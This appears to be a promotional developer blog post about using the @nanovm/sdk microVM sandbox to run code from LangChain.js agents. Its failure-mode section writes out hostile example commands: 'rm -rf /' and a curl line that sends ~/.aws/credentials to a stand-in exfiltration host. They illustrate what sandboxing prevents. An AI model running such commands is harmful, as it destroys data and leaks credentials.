# Give your LangChain.js agent execute_python in three lines

> **TL;DR.** Node.js is the second-largest LLM-agent ecosystem
> after Python — LangChain.js, Vercel AI SDK, and Mastra all live
> here — but sandboxes for JS agents are thinner on the ground
> than for Python. `@nanovm/sdk` is a zero-dep TypeScript client
> that drops straight into LangChain.js's `bindTools` and gives
> the model a real KVM microVM to run generated code in. Three
> lines from `npm install` to a working tool.

## The Node.js agent story

If you're building an agent in Node, your options for a real
sandbox are:

- **Docker exec via `dockerode`** — real isolation, but every
  tool call is a ~100–500 ms Docker round-trip. A LangGraph
  ReAct loop that hits `execute_python` 50 times pays 5–25 s
  of pure sandbox overhead.
- **`vm2` / `isolated-vm`** — runs the model's JS inside your
  Node process. No isolation from the host if the model wanders
  outside the sandbox (which it will). Also Python-blind.
- **Roll your own remote sandbox** — write a REST service that
  spins up a container per call. This is what most people do
  and it's a lot of glue.
- **Just trust the model** — the industry's actual default. No.

**nanovm** slots into slot #3 without the glue. `~12 ms` cold-start
against a warm pool, real KVM boundary, one npm install:

```sh
npm install @nanovm/sdk
```

## Three lines with LangChain.js

The full working example — model + sandbox + tool + agent:

```ts
import { Client } from "@nanovm/sdk";
import { nanovmToolSchemas, dispatchNanovmToolCall } from "@nanovm/sdk/agents";
import { ChatOpenAI } from "@langchain/openai";

const sandbox = new Client("https://api.nanovm.example.com", { token: "nv_..." });
const llm = new ChatOpenAI({ model: "gpt-4o" }).bindTools(nanovmToolSchemas());

const rsp = await llm.invoke([
  { role: "user", content: "Compute pi to 40 digits" },
]);

for (const call of rsp.tool_calls ?? []) {
  const output = await dispatchNanovmToolCall(
    sandbox, call.name, JSON.stringify(call.args),
    { snapshot: "python-3.12-minimal" },
  );
  console.log(output);  // → exit_code=0\nstdout:\n3.141592...
}
```

That's a real Chat Completions call to GPT-4o, a real
`execute_python` tool schema wired up via `bindTools`, a real
~12 ms fork of a real KVM microVM to run whatever code GPT-4o
emitted, and the tool output threaded back for the next turn of
the ReAct loop.

## Why `bindTools` "just works"

The OpenAI function-tool JSON-Schema shape is the lingua franca
of every current agent framework:

- **LangChain.js** — `bindTools` accepts it directly.
- **Vercel AI SDK** — `streamText({tools: ...})` accepts it with a
  two-line `jsonSchema()` wrap.
- **OpenAI Assistants / Responses / Chat Completions** — verbatim.
- **Anthropic tool use** — `parameters` → `input_schema`, otherwise
  identical.

`@nanovm/sdk/agents` returns exactly that shape from
`nanovmToolSchemas()`, and `dispatchNanovmToolCall()` handles the
inverse — parses the model's `arguments` JSON, invokes the right
sandbox action, catches every possible failure into an `error:`
string the model can self-correct against on its next turn. Zero
peer deps, zero adapter version drift.

## The "fork once, run N calls" pattern

For agents where a single task emits multiple tool calls, forking
one VM per call is wasteful. Use `Sandbox`:

```ts
await using sb = sandbox.sandbox("python-3.12-ds");
await sb.executePython("import pandas as pd");                   // ~12 ms fork
await sb.executePython("df = pd.DataFrame({'x': [1, 2, 3]})");   // same VM
console.log((await sb.executePython("print(df.sum().to_dict())")).stdout);
```

`await using` fires the destructor on scope exit (Node ≥ 20 / TS
≥ 5.2). On older runtimes, `sb.open()` and `sb.close()` are
explicit.

The dispatcher above is fork-per-call by design — every OpenAI
`ToolCall` gets a fresh VM — because that's the honest security
posture for untrusted model output. If you know your tool calls
are collaborative (a Jupyter-kernel-style back-and-forth), the
`Sandbox` pattern is a factor-of-N win.

## Sizing the win vs "just run it locally"

Node agent frameworks tend to default to `child_process.exec` in
their examples because "it's just a demo." The failure mode when
that ships:

- Model emits `rm -rf /` in a Bash tool call. You cry.
- Model emits `curl exfiltrator.example.com < ~/.aws/credentials`
  in a Bash tool call. You cry harder.
- Model emits `pip install package-that-does-not-exist` in a
  Python tool call. Package gets typo-squatted next week and now
  runs on every agent turn.

Every one of those is a hard-boundary failure that a KVM microVM
prevents by construction. The cost of the boundary is ~12 ms
per call — LLM roundtrip is 500–3000 ms, so the sandbox is 2–3
orders of magnitude cheaper than the model call it protects.

## Vercel AI SDK / Mastra

Same shape, three-line wrap. See the
[TypeScript SDK README](https://github.com/ip888/rust-nano-vm/blob/main/clients/typescript/README.md)
for Vercel AI SDK + Anthropic + OpenAI Assistants examples.

## Try it

There's a [free tier](https://nanovm.example.com/pricing) with
5 forks/sec + 10K forks/month for hobby use, or self-host — Apache
2.0 / MIT dual-licensed. `npm install @nanovm/sdk` and start.

Full source + framework examples:
[github.com/ip888/rust-nano-vm](https://github.com/ip888/rust-nano-vm).
